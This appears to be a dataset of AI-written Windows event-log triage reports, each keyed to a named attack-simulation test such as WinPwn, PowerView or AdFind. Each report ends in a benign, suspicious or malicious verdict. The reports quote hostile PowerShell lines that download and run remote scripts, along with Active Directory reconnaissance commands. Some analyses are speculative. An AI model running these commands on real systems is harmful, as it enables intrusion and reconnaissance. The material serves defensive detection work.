   - Numerous Sysmon logs (Event ID 1 for process creation and Event ID 5 for process termination) associated with command-line tools like `wevtutil.exe` and `powershell.exe` indicate an administrative user (`SERVER002\admin_test`) executing system utilities. The use of `powershell.exe` for AD recon suggests an unauthorized operation aimed at information gathering.
   - Suspicious `HOSTNAME.EXE` and `whoami.exe` executions point towards efforts to enumerate and possibly pivot within the network environment.
   - The heavy activity related to `MicrosoftEdgeUpdate.exe` during the analysis timeframe seems benign as it depicts regular update processes.

4. **Application and System Logs:**
   - Regular loggings such as Windows Defender status checks and security platform services (e.g., `sppsvc.exe`) operations indicate expected behavior with no significant irregularities within the timeframe.

**Assessment:**
- The presence of `ADRecon.ps1` being executed poses a significant concern as it's typically utilized to audit environments for vulnerabilities and assess permissions, often seen in preparatory stages of an attack.
- Logs suggest meticulous command line usage which aligns with unauthorized or suspicious activities, reflective of reconnaissance attempts.
  
**Resolution: SUSPICIOUS**
- The logs indicate suspicious activity due to the execution of a known reconnaissance script (ADRecon.ps1), possibly pointing towards an internal threat or infiltration attempt needing further investigation to understand the origin and intent.

**Recommended Next Steps:**
- Conduct a thorough investigation of who executed the `ADRecon.ps1` script and under what context. Review security practices and credential usage to prevent unsolicited internal reconnaissance.
- Audit `SERVER002\admin_test` user activities, verify the need for access level, and assess for potential exposure or account compromise.
- Enhance monitoring around administrative activity with stringent logging and anomaly detection focused on common lateral movement and enumeration patterns.
- Conduct a security review of external connections and firewall settings to determine if there was an attempt to exfiltrate data or pivot outside the environment."
WinPwn - winPEAS,"The analysis of the logs indicates potential malicious activity:

1. **Suspicious PowerShell Activity:**
   - The PowerShell logs show the execution of a script from ""https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1"". This execution involves the use of `iex` (Invoke-Expression), which is often used in PowerShell attacks to download and execute code from the internet.
   - The script executed (`WinPwn.ps1`) is known for being used in penetration testing and could indicate an attempted or active exploitation.
   - The presence of `winPEAS` suggests information gathering on the system, which could be a precursor to further exploitation.

2. **Privilege Escalation and Reconnaissance:**
   - `winPEAS` is a privilege escalation auditing script used for finding possible paths to escalate privileges on a Windows system.
   - This action suggests the user is trying to gather sensitive information about the system to exploit security weaknesses.

3. **Indicators of Compromise in Sysmon:**
   - Multiple logs show execution of `powershell.exe` with the same malicious script invocation, further reinforcing that this script activity is not a one-off or accidental execution.
   - The high integrity level of the executed processes indicates administrative privileges were used, enhancing the potential impact.

4. **Edge Update Activities:**
   - Activities related to EdgeUpdate seem routine and do not exhibit clear signs of tampering or malicious behavior, matching typical update processes.

5. **System and Security Logs:**
   - Adjustments of system time via `svchost.exe` were noted but can occur for legitimate reasons. However, correlated with PowerShell activity, it raises concerns that could suggest manipulation of timestamps for evasion purposes.

**Recommendation:**
- Immediate containment should be considered, including isolating the affected system to prevent further spread.
- Conduct a full investigation to determine the intent and extent of the intrusion. Examine any downloads or actions prompted by the script.
- Review the full context of user activities around `powershell.exe` and potentially related user accounts.
- Implement stricter network controls for PowerShell execution and consider restricting PowerShell workflows.
- Enhance monitoring for PowerShell execution policies, and review any outgoing traffic to identify possible data exfiltration.

**Resolution: MALICIOUS**  
- The logs indicate malicious activity primarily due to the unauthorized execution of suspicious scripts, potential privilege escalation attempts, and reconnaissance on the system. This justifies the classification as malicious."
System Service Discovery - net.exe,"Upon reviewing the provided Windows event logs, there are several points of interest that may indicate anomalous or potentially suspicious activity on the host. Here’s a detailed analysis:

### Security Log Analysis:
1. **Logon Events:**
   - Multiple **Event ID 4624** entries for `admin_test` with LogonType 3 (Network logon) are observed. The logon type and successful logons via NTLM authentication should prompt a check on whether these logons are expected or authorized, particularly from the source `DESKTOP-3HL5B2P`.
   - **Event ID 4672** indicates that `admin_test` was granted special privileges (e.g., SeDebugPrivilege). The presence of these privileges is highly sensitive as they allow for debugging and potentially tampering with Windows processes.

2. **Credential Access Attempts:**
   - **Event ID 5379** logs show repeated attempts to access credentials related to a MicrosoftAccount and WindowsLive session using the Server's machine account (SERVER002$). The failed credential access (ReturnCode 3221226021) could suggest attempts to access resources or services unsuccessfully.

### Sysmon Log Analysis:
1. **Process Creation:**
   - There are frequent entries regarding the execution of system utilities like `wevtutil.exe` and `conhost.exe` by the `admin_test` user, often associated with Windows system maintenance or administrative tasks.
   - Specific attention is drawn to the execution of `cmd.exe` with arguable intent: running `net.exe` to list services into a temporary text file (indicative in the command line: `""cmd.exe"" /c net.exe start >> %%temp%%\\service-list.txt`). While this may be used for legitimate purposes, it could be part of reconnaissance if unauthorized.
   - Further process execution involving system components such as `whoami.exe` and `hostname.exe` again point to potential script execution for gathering system information.

### Further Observations:
1. **Update Installation:**
   - The logs indicate recent updates for Microsoft Defender and Edge, which can be routine; however, the event sequences and update installations align tightly with the other suspicious log entries, making it prudent to verify these processes and executables for tampering.

2. **Contextual Risk:**
   - The rapid sequence of high-privilege process activities could constitute evidence of post-exploitation activity or lateral movement if unauthorized.
   - The appearance of events related closely in time and handling of sensitive actions should prompt a review of the integrity of system maintenance scripts or tasks that may have been exploited for malicious usage.

### Resolution:
The logs contain indications that further investigation is warranted due to high-privilege activities, unusual credential access attempts, and the context involving potentially scripted activity gathering system intelligence:

- **Resolution:** **SUSPICIOUS**

### Guidance on How to Proceed:
1. Conduct a thorough review of recent user activity associated with `admin_test` and the interacting systems (`DESKTOP-3HL5B2P`) for any anomalies.
2. Examine the scripts, scheduled tasks, or applications that could spawn these utilities unexpectedly.
3. Check the authenticity and hash values of executables that align with sensitive operations (e.g., `wevtutil.exe`, `cmd.exe`, etc.).
4. Monitor network logs to track any unusual outbound traffic or unauthorized resource access.
5. Patch any vulnerabilities that may expose the system to privilege abuse based on the privileges granted in the logs.
6. Perform a full scan with updated malware definitions to rule out signs of infection."
Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting),"After analyzing the provided event logs, here is a detailed breakdown of the observations:

1. **Security Log Analysis**:
   - **Event IDs 4624 & 4672**: These events are related to logon attempts and special privileges assigned to SYSTEM. The frequent SYSTEM logons and privilege assignments might suggest legitimate activities by Windows services. However, there are numerous events concerning logon types (Type 5), which are usually linked to service logons.
   - **Event ID 5379**: It indicates credential reading attempts with a specific return code (3221226021). This code corresponds to ""STATUS_LOGON_FAILURE,"" often indicating unsuccessful logon attempts. The repeated attempts to access Microsoft accounts and Windows Live services suggest potential malicious activity.

2. **Sysmon Log Analysis**:
   - **Powershell Execution (Event ID 1)**: Multiple instances where PowerShell commands were executed, notably: `Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name`. This indicates a script checking for users with specific account settings, which could be routine administrative tasks or reconnaissance for malicious intentions, especially when executed by a non-typical admin account (`admin_test`).
   - **Wevtutil and Conhost Usage**: Exploiting tools like `wevtutil`, a legitimate Windows utility, to manage event logs and `conhost.exe` as interactive interfaces may resemble typical behavior but should be reviewed further to assess the legitimacy.
   - **Powershell launched by `admin_test`**: Although `admin_test` is often used, depending on the organization, to execute a command checking users with certain access flags might raise a concern if it deviates from typical patterns.

3. **Windows PowerShell Log Analysis**:
   - Logs reveal attempts to interact with Active Directory (AD) using PowerShell, as previously noted. Running such commands in a network setting without authorization can be indicative of an insider threat or a compromised account attempting lateral movements or gathering user information.

4. **Application Log Analysis**:
   - Majority events are from Microsoft Edge Updates and Windows Defender. These logs indicate routine service actions and updates with no immediate sign of malicious activity.

**Threat Assessment**:
Based on the observed logs, here are the primary indicators of suspicious behavior:

- Frequent failed credential access attempts to Microsoft accounts, especially repeated failures with a specific session identifier.
- Unusual powershell activity checking AD for users with particular account control settings, possibly indicating reconnaissance activity.
- Consistent use of `wevtutil` under a less typical administrative context, which could indicate an attempt to tamper with logs or maintain persistence.

**Resolution**:
The evidence suggests potential suspicious activity due to failed credential access patterns and the use of PowerShell for networking checks on AD. This behavior warrants further investigation, particularly focusing on the user account `admin_test` and any related credential policies to ensure security measures are enforced properly.

**Final Resolution: SUSPICIOUS**

**Recommended Actions**:
1. **Immediate Action**: Monitor and restrict account `admin_test` to prevent further unauthorized actions and confirm if the account actions were legitimate or expected.
2. **Further Investigation**: Conduct a deep dive into network traffic and endpoint activity, checking the context of logged PowerShell executions and any external access attempts associated with the suspicious user.
3. **Authentication Review**: Investigate failed logins associated with `MicrosoftAccount:user=02txoixylodcstop` and neighboring periods to ascertain the origin and intent.
4. **Audit Logs Monitoring**: Intensify monitoring of logs for any similarly patterned events and adjust SIEM thresholds for similar PowerShell command monitoring.

Ensure security protocols are reinforced to avoid potential security breaches or exploitation by unauthorized users."
Device Driver Discovery,"After analyzing the provided logs, several activities stand out which could suggest unusual and potentially suspicious behavior. Here's a detailed analysis:

1. **Frequent Execution of System Utilities**:
    - The logs show repeated executions of `wevtutil.exe`, `conhost.exe`, `powershell.exe`, and command-line tools like `whoami.exe` and `driverquery.exe`.
    - `wevtutil.exe` is a legitimate Windows utility for managing event logs, but frequent usage, especially when not typically logged by regular users, may indicate an attacker trying to clear tracks or gather information.
    - `conhost.exe` is a component that acts as a command prompt host, which shows legitimate process usage in conjunction with other applications.
    - `whoami.exe` is used to identify the logged-in user and `driverquery.exe` is used to list drivers. Both tools can be part of reconnaissance activity by malicious actors.

2. **PowerShell Activity**:
    - There is an instance where PowerShell commands execute system commands like `driverquery /v /fo list` and `driverquery /si /fo list`. PowerShell can be used for legitimate automation but is also commonly leveraged by attackers due to its powerful capabilities and scripting nature.

3. **Time Manipulation Event**:
    - A change in system time was recorded, which could suggest an attempt to manipulate event log timestamps to hide activity. This is typically not normal behavior for regular server operations and can be indicative of malicious behavior aiming to obscure evidence.

4. **Privilege Escalation**:
    - The user `SERVER002\admin_test` has been seen with elevated privileges (`SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeLoadDriverPrivilege, etc.`), identifying a logon with a high token elevation, which could be normal depending on the user's role, but bears further scrutiny especially coupled with the other points.

5. **Logons and Session Management**:
    - Multiple logon events are recorded for `SERVER002\admin_test` using NTLM authentication from a workstation named `DESKTOP-3HL5B2P` with different IP addresses logged. These events should be evaluated against regular user behavior patterns.

6. **Microsoft Edge Update Logs**:
    - Several instances of `MicrosoftEdgeUpdate.exe` were logged. While software updates could be legitimate, they can also sometimes be misused for privilege escalation or persistence mechanisms if executed by unauthorized actors.

### Assessment and Conclusion:
Given the activities:
- **Frequent and systematic use of system utilities and tools** for potential reconnaissance.
- **Time manipulation attempts.**
- **Unusual PowerShell commands** which could indicate scripts being executed for system enumeration or data exfiltration.

The overall pattern of behavior sketched by these logs is not typically aligned with standard operations or IT maintenance. These activities suggest potentially malicious reconnaissance and preparation stages within the environment that warrant concern.

**Resolution**: **SUSPICIOUS**

### Guidance:
- Investigate the context and background of the `SERVER002\admin_test` user, including role and job responsibilities.
- Conduct a more in-depth analysis of network traffic, especially connections from `192.168.0.102` and the workstation `DESKTOP-3HL5B2P`.
- Examine any other logs and artifacts (e.g., file changes, network connections) that may be related to these events.
- Consider securing the system where these activities were observed and assess other systems for similar activity patterns.
- Recommend running antivirus or endpoint detection response (EDR) tools to search for known malware or indicators of compromise (IOCs).
- Ensure all security patches and updates are applied, especially for applications frequently seen in these logs."
WinPwn - MS17-10,"Upon reviewing the provided Windows event logs, I've identified several entries within different logs that warrant close attention:

1. **System Log Events**:
   - The series of `EventID 24` and `EventID 1` indicate frequent and very close time changes managed by `svchost.exe`. Frequent time changes could be a tactic employed by malware to manipulate system logs and timestamps.

2. **Windows PowerShell Events**:
   - Multiple entries with `EventID 600` show the execution of PowerShell involving the command line: `powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') MS17-10 -noninteractive -consoleoutput}`.
   - Downloading scripts directly from a repository and executing them, especially security-related scripts (suggested by ""S3cur3Th1sSh1t""), is a significant sign of potential malicious activity.

3. **Security Log Events**:
   - `EventID 4672` indicates that the user `admin_test` had been granted a wide range of privileges (SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.). While this may occur in administrative contexts, the presence of such wide privileges can be concerning if not expected, especially if observed in conjunction with other suspicious activity.

4. **Sysmon Events**:
   - Multiple instances of executed processes such as `wevtutil.exe` and `conhost.exe` appear together, suggesting potential use of the command line for administrative or script execution tasks.
   - The `EventID 1` involving `PowerShell.exe` with a potentially malicious command supports evidence from the PowerShell logs indicating the unauthorized execution of scripts.

5. **Additional Considerations**:
   - Since PowerShell is involved in downloading and possibly executing remote scripts, this aligns with known attack techniques, such as leveraging PowerShell to execute scripts from remote locations for lateral movement or remote code execution.

**Assessment and Findings**:
The activity observed, such as unauthorized PowerShell execution of external scripts, time manipulation, and the presence of elevated privileges, are strong indicators of potentially harmful actions indicative of an attack or compromise.

**Resolution**: **MALICIOUS**
The analysis conclusively points to malicious activity based on the execution of a potentially harmful script and abnormal system manipulations.

Port Scan NMap for Windows,"### Detailed Analysis:

#### **System Log:**
- **Service Control Manager (Event ID 7045)**: 
  - **Npcap Packet Driver (NPCAP)** and **Microsoft KM-TEST Loopback Adapter Driver**: Both are drivers commonly associated with network packet monitoring and diagnostics tools. Npcap, for instance, is legitimate software used by nmap for packet capture. There's no indication of startup type being persistent here, which means these are likely legitimate installations directed by an installer process.
  
- **Kernel-General (Event ID 15)**:
  - A system database file size change in the registry (`SCHEMA.DAT`). This is typical during software installation and is not inherently suspicious on its own, but it indicates registry activity, which aligns with an installation process or system configuration change.

#### **Security Log:**
- **Logon Events (Event ID 4624)**:
  - Logon Type 5 indicates a service startup. All the user accounts involved are either SYSTEM or machine-related (`SERVER002$`) under NT AUTHORITY. This matches patterns seen during auto-starting services or during system startup.
  
- **Privilege Use (Event ID 4672)**:
  - Multiple instances where the SYSTEM account utilizes privileges such as `SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc. This is standard for SYSTEM-level processes but could be used for malicious behavior if leveraged unwarrantedly by non-system processes.

#### **Windows PowerShell Log:**
- **PowerShell Execution (Event ID 600)**:
  - `powershell.exe & {nmap 127.0.0.1}`: This command suggests a local network scan being carried out. Nmap is a legitimate tool but can be used for network reconnaissance. The context (admin running PowerShell to execute this) suggests administrative awareness rather than covert execution.

#### **Sysmon Log:**
- **Process Creation and File Operations (Event IDs 1 & 5)**:
  - **Cmd.exe and PowerShell execution**: Executed by user `admin_test`, inferring administrative oversight. Nmap installation is indicated (`nmap-7.80-setup.exe`), and subsequent executions of Npcap driver installer (e.g., `npcap-0.9982-oem.exe`) are seen, which align with installing packet capture drivers for nmap.
  - **CertUtil** use (`certutil -addstore`) - A legitimate utility used here to manage certificates, likely to handle installation of certain components requiring trusted publishers.
  - Consistent with a legitimate installation process of Nmap and associated utilities for network diagnostics.

#### **Application Log:**
- **MsiInstaller Events (Event IDs 1040, 11707, etc.)**:
  - Indicate successful installations of Microsoft Visual C++ 2013 Redistributables, which are commonly installed to support software that depends on these libraries.

### Assessment:
Upon review, the logs indicate structured installation activity. There are numerous entries that show consistent and expected behavior of software being installed and configured, particularly Nmap and its dependencies (Npcap, Visual C++ redistributables). While certain PowerShell and command prompt actions are indicative of potential reconnaissance use, they seem explicitly initiated by an administrative user on the system.

### Resolution:
**BENIGN** - The actions represented in the logs seem to be associated with an authorized user installing and configuring legitimate diagnostic and packet capture software (Npcap and Nmap). No evidence of malicious intent, abuse of privileges, or covert execution by unauthorized processes is observed. However, continued monitoring for unintended external exposure or unauthorized access remains advised."
Get-DomainGPO to display group policy information via PowerView,"**Detailed Analysis of Logs:**

1. **Windows PowerShell Logs:**
   - Multiple events show the usage of PowerShell with a particular command-line:
     ```
     powershell.exe -nop -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/.../powerview.ps1'); Get-DomainGPO""
     ```
   - The command uses PowerShell to bypass execution policies (`-nop -exec bypass`) and download and execute a script from a GitHub repository linked to BC-SECURITY's Empire tool.
   - Empire is a well-known post-exploitation toolset that can indicate malicious intent, especially when downloading scripts like PowerView, which is used for domain situational awareness.

2. **Sysmon Logs:**
   - Consistent execution of PowerShell commands with similar `-nop -exec bypass` flags, in line with evidence of potential malicious post-exploitation activity.
   - No direct logs indicating privilege escalation, but execution under a user account `SERVER002\admin_test` at a high integrity level suggests it may already have significant privileges.

3. **Application, Security, and System Logs:** 
   - Logs primarily show routine system operations and updates for Microsoft Edge. These appear to be normal and without any connection to the suspicious PowerShell activity.
   - Security logs do not indicate any anomalous behavior but do coordinate with timestamps of Sysmon indicating possible synchronization with some PowerShell activities.

**Conclusion and Assessment:**

The presence of PowerShell execution with commands to download and execute scripts from Empire suggests clear signs of a potential security breach or post-exploitation activities. The command specifically aims to gather domain information, a typical move during lateral movement in a network by an attacker.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

- **Immediate Containment:** Disconnect the affected host (Server002) from the network to prevent further information gathering or lateral movement by a potential attacker.
- **Investigation:** Conduct a thorough investigation into the origin of these PowerShell commands to identify compromised accounts or processes.
- **Mitigation:** Consider resetting credentials for affected accounts and implementing stricter PowerShell execution policies.
- **Long-term Measures:** Enhance monitoring and logging of PowerShell activities across the network and conduct a security audit to identify any other potential vulnerabilities."
Detect Virtualization Environment via WMI Manufacturer-Model Listing (Windows),"### Detailed Analysis

**Security Log:**
- The Security logs primarily contain events with Event ID 4616 which are related to changes in the system time. These logs indicate that the system time had been changed by the service `svchost.exe` under the `LOCAL SERVICE` context. This is typically a routine operation for time synchronization purposes and does not directly indicate malicious activity. 

**Windows PowerShell Log:**
- The PowerShell logs provide evidence of a script execution aimed at detecting whether the environment is virtualized. The script involves basic checks using `Get-WmiObject` to identify virtualization software. The script is executed by `powershell.exe`, which is not inherently suspicious but should be scrutinized due to its potential misuse in attacks. The purpose of the script, examining virtualization, could be legitimate, but confirming the intention behind it is important.

**Application Log:**
- The Application log includes typical service updates, such as those related to the Software Protection Platform and Edge updates. These events do not suggest any direct malicious activity and seem part of regular update processes.

**System Log:**
- System logs echo changes in system time and timezone adjustments, executed through `svchost.exe`. Similar to the Security log, these operations are normal for a Windows environment to maintain accurate time.

**Sysmon Log:**
- Sysmon logs exhibit a series of process creations using benign Windows system utilities (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) executed by the user `SERVER002\admin_test`. The usage of these utilities does not demonstrate any direct malicious intent.
- The script launch via `powershell.exe` with `Get-WmiObject` ties back to the PowerShell log, indicating a cohesive narrative.
- Other Sysmon events relate to the execution of Microsoft Edge Update processes. These events seem consistent with application updates and are aligned with application maintenance rather than showing malicious activity.

### Assessment
The entirety of the logs reveals the use of common Windows system utilities and powershell scripting. The consistency across logs suggests the absence of blatant malicious actions such as privilege escalation attempts or unauthorized network communications. However, the PowerShell script execution which checks for virtualization could potentially be used to detect the environment by malicious entities as a precursor to environment-specific payloads. Thus, it is essential to verify whether this script execution was authorized and intended by a legitimate user or process.

### Resolution
- **SUSPICIOUS:** The PowerShell script execution aimed at detecting virtualization environments warrants further investigation to ensure this action was intended by an authorized user or application. There are no strong indicators of compromise, but the context of the script helps in assessing its legitimacy and necessity within the environment. Further inquiry should involve:
  - Understanding why the script was executed and by whom.
  - Confirming the script’s intended purpose with system administrators or authorized personnel.
  - Monitoring for any subsequent anomalies that might arise in the event logs. 

Recommended actions would include reviewing user activity logs during this period, maintaining continuous monitoring, and validating that all executed scripts are authorized and align with typical operational needs."
Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd,"Upon analyzing the provided Windows event logs, the following observations and assessments were made:

1. **Security Log Observations**:
   - The logs contain an Event ID 4616, indicating a system time change was made by the process `svchost.exe`. The time was set backwards from `2024-10-23 22:02:09.1092678` to `2024-10-23 22:02:06.9357530`. This action is often seen in attempts to manipulate time-dependent logs or processes, and can potentially indicate malicious activity, such as an attacker attempting to screen their actions from being logged correctly.

2. **Windows PowerShell Log Observations**:
   - PowerShell events (Event ID 600) show the execution of a command via `powershell.exe` that calls an executable `AdFind.exe` from a temporary directory path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe`. AdFind is a legitimate tool, but it can be used by attackers for reconnaissance purposes in Active Directory environments, suggesting potentially suspicious intentions.

3. **System Log Observations**:
   - The kernel logs reiterate the time change mentioned in the security logs, further confirming a system time modification.

4. **Sysmon Log Observations**:
   - Frequent execution of tools like `whoami.exe` and `hostname.exe` suggest potential enumeration activity by a user or process.
   - Notably, the execution of `wevtutil.exe` in the `Sysmon` logs can be suspicious, as `wevtutil` is used to manage event logs, and in malicious contexts, it may be used to clear logs to cover tracks.

5. **Application Log Observations**:
   - No significantly suspicious activity was identified within the given entries, with the `Software Protection Platform Service` event indicating regular operations.

**Assessment**:
- The presence of `AdFind.exe` being executed from a temp directory, suspected malicious use of legitimate tools for reconnaissance (such as `whoami.exe`), and system time manipulation, combined with potential log tampering activities, constitute noteworthy anomalous behavior.
- While `svchost.exe` and `AdFind.exe` might be associated with legitimate usage, their context and execution patterns here align with tactics observed in lateral movement and reconnaissance in attack vectors.

**Resolution**: **SUSPICIOUS**
- This log analysis indicates activity that could potentially be malicious or part of unauthorized behavior on the system. Further investigation is necessary to confirm the intent behind these actions and whether they are sanctioned.

**Guidance for Further Action**:
- Conduct a detailed investigation into who executed the PowerShell script and the purpose of the `AdFind.exe` utility.
- Verify changes around the time the system time was modified and check for additional unauthorized or corresponding actions.
- Check for any cleared or manipulated logs, focusing on `wevtutil.exe` usage.
- Consider deploying additional monitoring and alerting to catch similar activities in the future, and perform a thorough audit of privileged accounts and their recent actions on the network."
View available share drives,"Based on the provided log entries from various Windows logs, here's the analysis of the events that occurred on the computer ""Server002"":

**Security Logs:**
- The entries show events with EventID 4616, which indicates changes in the system time. These events are not necessarily malicious, especially considering they are related to the ""LOCAL SERVICE"" user and `svchost.exe`.

**System Logs:**
- Updates related to Microsoft Defender Antivirus were completed successfully. No anomalies were noted.
- Entries with EventID 24 and 1 from ""Microsoft-Windows-Kernel-General"" events indicate a system time change. Time synchronization activities are typical in systems connected to networks to maintain accurate time settings.

**Application Logs:**
- Logs from ""SecurityCenter"" and ""edgeupdate"" show normal service operations like Windows Defender being turned on and the Edge Update service stopping and starting. These entries do not raise immediate red flags.

**Sysmon Logs:**
- Multiple events indicate the execution of standard Windows binaries like `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `net.exe`, and `whoami.exe` by the user `SERVER002\admin_test`. These commands are often legitimate but can be leveraged for malicious activities especially in chain execution or when executed with elevated privileges.
- `cmd.exe` was executed with the command line `cmd.exe /c net share`, which is used to list shared directories on a network. While not inherently malicious, frequent or unexpected executions need further investigation.

**Assessment:**
- The logs show activities involving legitimate system processes and updates but do raise minor concerns about the frequent execution of potentially privileged commands, such as `wevtutil.exe` and network commands via `cmd.exe`. The ""edgeupdate"" activities align with a known application (Microsoft Edge), showing typical update operations.

**Conclusion:**
Given the processes and commands observed, while no definitive malicious actions are noted, the presence of potentially sensitive command usage necessitates some caution.

**Resolution: SUSPICIOUS**
- Consider further investigation into logon sessions and process creation events around the reported time frames.
- Evaluate network activity and historical use patterns for the `SERVER002\admin_test` account to determine if actions are consistent with legitimate use.
- Ensure endpoint protection measures, including regular scans and updates, are actively running on this and similar systems.

Further analysis is recommended if this behavior deviates from the known baseline of the user or server in question."
Enumerate Remote Hosts with Netscan,"Upon reviewing the provided logs, there are several points of interest that warrant further analysis:

1. **Repeated Credential Guard Events (Event ID 5379):** There are multiple instances of Event ID 5379 indicating attempts to retrieve credentials. Each of these attempts failed with a return code of 3221226021, which suggests unsuccessful operations potentially linked to an unauthorized access attempt or misconfiguration regarding credential retrieval. However, without further evidence, these errors alone do not definitively indicate malicious activity.

2. **Privileged Logon Event (Event ID 4624 and 4672):** A logon event for the SYSTEM account is recorded, followed by an event granting a wide array of privileges (e.g., SeDebugPrivilege, SeTcbPrivilege). Such privileges are typically part of system operations but, if used inappropriately, could be indicative of privilege escalation attempts. The context, particularly if related to scheduled tasks or updates, may explain this as benign.

3. **Suspicious Use of PowerShell and Command Execution:**
   - There is an execution of PowerShell events followed by command executions that involve `netscan.exe`, an application for network scanning, executed via an obscured path: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\netscan\\64-bit\\netscan.exe`. The usage of network scanners can be an indication of reconnaisance activities, and the obfuscation of paths is often used to hide such attempts.
   - The PowerShell log entries (Event ID 600) corroborate the execution of PowerShell with the intention to run `netscan.exe`. The use suggests attempts to automate scanning activities, and possibly evading detection.

4. **Normal Update and System Maintenance Activities:**
   - Several entries (e.g., Windows Update logs) detail updates applied to Microsoft products such as Defender, which are normal and expected activities for system maintenance.
   - Other routine operations include Windows services activities (`svchost.exe` execution) linked to update services, and the execution of `MpSigStub.exe` for signature updates, which appear to follow standard update operations.

Given this analysis:

- The unsuccessful credential access attempts require additional context to ascertain if they are misconfigurations or attempts at unauthorized access.
- The privilege usage, when linked with updates and system operations, may not immediately suggest compromise.
- The execution and use of `netscan.exe` via PowerShell commands, with obscured paths, is suspicious and points to a potential threat actor conducting internal reconnaissance or vulnerability scanning activities.

**Resolution:** SUSPICIOUS

### Guidance:
- Conduct a thorough review of account access and privilege assignments around the timeframe of observed activities to ensure no unauthorized privilege escalations or logons occurred.
- Investigate the purpose and origin of the `netscan.exe` within the system; determine if it's legitimate software or part of a reconnaissance attempt.
- Cross-reference similar activities in other systems within the network environment for potential widespread unauthorized scanning or reconnaissance.
- Implement tighter PowerShell execution policies and monitor for similar activities, while considering additional network scanning detection and prevention measures."
Peripheral Device Discovery via fsutil,"Upon analyzing the provided Windows event logs, here is a detailed analysis of the situation:

### Application and System Logs
- **edgeupdate Service Stopped**: The log entries related to the `edgeupdate` service stopping do not inherently indicate malicious behavior. It is fairly common for services to stop during routine updates or due to other non-malicious reasons.

- **Time Change Events**: The `EventID: 1` from `Microsoft-Windows-Kernel-General` reflects the system time changes. These are not immediately indicative of malicious activity; often, they might be related to NTP synchronization or other legitimate system clock adjustments.

### Security Logs
- **TimeChange, EventID: 4616**: These logs show time change events executed by `svchost.exe`. While persistent time changes can be suspicious if linked to malicious intent (e.g., covering tracks), the provided logs suggest operations performed by `LOCAL SERVICE`, which is standard.

### Sysmon Logs
- **Process Creation Events**: Various benign processes (`hostname.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`) are logged. They don't show immediately suspicious activity based solely on these logs.
  
- **Edge Update Activity**: The logs show significant activity by `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup.exe`, and related binaries under `NT AUTHORITY\SYSTEM`. This involves command line arguments related to updating Microsoft Edge. There's no clear indication of malicious intent here, as these actions align with legitimate behavior for keeping Microsoft software up-to-date.

### General Observations
- **Use of Standard Tools**: The use of standard utilities (`hostname`, `whoami`, `conhost`, `cmd`) in logged events suggests regular operational behavior rather than malicious.

- **No Clear Exhibits of Malicious Indicators**: Across all logs, there is no evidence of unusual process execution patterns, suspicious command-line arguments, or privileges that suggest compromise.

- **Edge Update Operations**: While the heavy involvement of Microsoft Edge Update processes might typically warrant a deeper look, the lack of anomalous activities and known legitimate update operations suggest benign behavior.

### Conclusion
Based on the evidence provided and analyzed:

**Resolution: BENIGN**

The logged activities appear consistent with legitimate system operations, particularly related to routine updates and time adjustments, with no explicit indicators pointing towards compromise. However, as always, continued vigilance in monitoring systems for unexpected behavior is recommended."
Enumerate all accounts via PowerShell (Domain),"### Detailed Log Analysis:

#### Sysmon Log Analysis:

1. **wevtutil.exe and conhost.exe Activity:**
   - Multiple entries of `wevtutil.exe` paired with `conhost.exe` indicate that these processes were repeatedly started. `wevtutil.exe` is commonly used for querying or exporting Event logs, while `conhost.exe` is related to console windows. The frequent executions in a short time span (around the same second) could indicate either script automation or manual commands being executed in quick succession.

2. **PowerShell, net.exe/net1.exe Commands:**
   - There are multiple instances of `powershell.exe` executing with the command `powershell.exe & {net user /domain, get-localgroupmember -group Users, get-aduser -filter *}`. This command could be used to enumerate users and groups, which might be typical for an administrative script but could also indicate potential reconnaissance activity.

#### PowerShell Log Analysis:

- The PowerShell event logs align with the Sysmon logs showing the command execution of PowerShell with user enumeration and group member checking. These tasks might be benign if performed by an admin user like `SERVER002\admin_test`, but unusual if not part of typical administrative operations.

#### Security Log Analysis:

- **Event ID 4799:**
  - Indicates enumerating or attempting to access user/group information using PowerShell, which matches the PowerShell and Sysmon logs.

#### System and Application Logs:

- These logs don't provide strong implications of malicious activity but offer context around system services and potential time synchronization activities.

### Assessment:

- **Pattern of Activities:** The combination of commands with `net.exe`, `wevtutil.exe`, and PowerShell involving user and group enumeration suggests these activities could either be part of routine administration or reconnaissance for malicious intent.
- **Account Usage:** The operations are executed under the user `SERVER002\admin_test`, which could either be a legitimate admin account or one that has been compromised.
  
### Conclusion:

Given the potential for the observed activities to be legitimate in a controlled environment or indicative of reconnaissance and enumeration by an attacker, the logs should be classified as:

- **SUSPICIOUS** - The activity requires further investigation. Determine if `SERVER002\admin_test` had a legitimate need to perform these tasks. Check for other signs of suspicious activity, such as unauthorized access or unusual behavior from this account or IP address. Validate if any alerts were raised in context with this behavior to ensure it aligns with expected administrative tasks."
System Information Discovery with WMIC,"Upon reviewing the Sysmon logs provided, here's a summary and analysis of the observed activity:

1. **System Information Gathering:**
   - There are logs showing the execution of `whoami.exe`, `hostname.exe`, and multiple instances of `wmic.exe` retrieving system information such as CPU, Memory, Baseboard, BIOS version, OS details, and DiskDrive. These processes were executed under the user `SERVER002\admin_test` with high integrity level, indicating administrative privileges.
   - The command line used by `cmd.exe` to execute various `wmic` commands seems to suggest system reconnaissance activity. This kind of behavior is often a precursor to more intrusive activities but can also be seen in legitimate administrative tasks.

2. **Event Log Manipulation:**
